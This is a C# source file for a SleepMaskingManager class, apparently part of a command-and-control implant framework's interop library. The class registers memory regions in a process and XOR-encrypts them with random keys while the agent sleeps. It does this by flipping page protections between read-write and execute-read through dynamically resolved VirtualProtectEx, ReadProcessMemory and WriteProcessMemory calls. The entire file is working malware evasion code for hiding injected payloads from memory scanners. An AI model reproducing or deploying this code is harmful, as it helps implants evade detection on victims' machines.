using System;
using System.Collections.Concurrent;
using System.Runtime.InteropServices;
using ApolloInterop.Classes.Api;
using ApolloInterop.Interfaces;

namespace ApolloInterop.Classes.Core
{
    public class SleepMaskingManager : ISleepMaskingManager
    {
        private struct TrackedRegion
        {
            public IntPtr ProcessHandle;
            public IntPtr BaseAddress;
            public int Size;
            public byte[] XorKey;
            public bool IsMasked;
        }

        private delegate bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        private delegate bool ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            uint nSize,
            out uint lpNumberOfBytesRead);

        private delegate bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            uint nSize,
            out uint lpNumberOfBytesWritten);

        private const uint PAGE_READWRITE = 0x04;
        private const uint PAGE_EXECUTE_READ = 0x20;

        private readonly ConcurrentDictionary<IntPtr, TrackedRegion> _regions = new ConcurrentDictionary<IntPtr, TrackedRegion>();
        private readonly VirtualProtectEx _pVirtualProtectEx;
        private readonly ReadProcessMemory _pReadProcessMemory;
        private readonly WriteProcessMemory _pWriteProcessMemory;
        private readonly object _lock = new object();

        public SleepMaskingManager(IAgent agent)
        {
            _pVirtualProtectEx = agent.GetApi().GetLibraryFunction<VirtualProtectEx>(Library.KERNEL32, "VirtualProtectEx");
            _pReadProcessMemory = agent.GetApi().GetLibraryFunction<ReadProcessMemory>(Library.KERNEL32, "ReadProcessMemory");
            _pWriteProcessMemory = agent.GetApi().GetLibraryFunction<WriteProcessMemory>(Library.KERNEL32, "WriteProcessMemory");
        }

        public void RegisterRegion(IntPtr hProcess, IntPtr baseAddress, int size)
        {
            byte[] key = Guid.NewGuid().ToByteArray();
            var region = new TrackedRegion
            {
                ProcessHandle = hProcess,
                BaseAddress = baseAddress,
                Size = size,
                XorKey = key,
                IsMasked = false
            };
            _regions[baseAddress] = region;

            // Immediately mask the newly registered region to minimize exposure
            MaskSingleRegion(baseAddress);
        }

        public void UnregisterRegion(IntPtr baseAddress)
        {
            _regions.TryRemove(baseAddress, out _);
        }

        public void MaskSingleRegion(IntPtr baseAddress)
        {
            lock (_lock)
            {
                TrackedRegion region;
                if (!_regions.TryGetValue(baseAddress, out region))
                    return;
                if (region.IsMasked)
                    return;

                if (DoMask(ref region))
                {
                    region.IsMasked = true;
                    _regions[baseAddress] = region;
                }
            }
        }

        public void MaskAllRegions()
        {
            lock (_lock)
            {
                foreach (var kvp in _regions)
                {
                    var region = kvp.Value;
                    if (region.IsMasked)
                        continue;

                    if (DoMask(ref region))
                    {
                        region.IsMasked = true;
                        _regions[kvp.Key] = region;
                    }
                }
            }
        }

        public void UnmaskAllRegions()
        {
            lock (_lock)
            {
                foreach (var kvp in _regions)
                {
                    var region = kvp.Value;
                    if (!region.IsMasked)
                        continue;

                    if (DoUnmask(ref region))
                    {
                        region.IsMasked = false;
                        _regions[kvp.Key] = region;
                    }
                }
            }
        }

        private bool DoMask(ref TrackedRegion region)
        {
            try
            {
                uint oldProtect;
                if (!_pVirtualProtectEx(region.ProcessHandle, region.BaseAddress, (uint)region.Size, PAGE_READWRITE, out oldProtect))
                    return false;

                byte[] buffer = new byte[region.Size];
                uint bytesRead;
                if (!_pReadProcessMemory(region.ProcessHandle, region.BaseAddress, buffer, (uint)region.Size, out bytesRead))
                {
                    _pVirtualProtectEx(region.ProcessHandle, region.BaseAddress, (uint)region.Size, oldProtect, out _);
                    return false;
                }

                XorInPlace(buffer, region.XorKey);

                uint bytesWritten;
                _pWriteProcessMemory(region.ProcessHandle, region.BaseAddress, buffer, (uint)region.Size, out bytesWritten);

                return true;
            }
            catch
            {
                return false;
            }
        }

        private bool DoUnmask(ref TrackedRegion region)
        {
            try
            {
                byte[] buffer = new byte[region.Size];
                uint bytesRead;
                if (!_pReadProcessMemory(region.ProcessHandle, region.BaseAddress, buffer, (uint)region.Size, out bytesRead))
                    return false;

                XorInPlace(buffer, region.XorKey);

                uint bytesWritten;
                _pWriteProcessMemory(region.ProcessHandle, region.BaseAddress, buffer, (uint)region.Size, out bytesWritten);

                uint oldProtect;
                _pVirtualProtectEx(region.ProcessHandle, region.BaseAddress, (uint)region.Size, PAGE_EXECUTE_READ, out oldProtect);

                return true;
            }
            catch
            {
                return false;
            }
        }

        private static void XorInPlace(byte[] data, byte[] key)
        {
            int keyLen = key.Length;
            for (int i = 0; i < data.Length; i++)
            {
                data[i] ^= key[i % keyLen];
            }
        }
    }
}
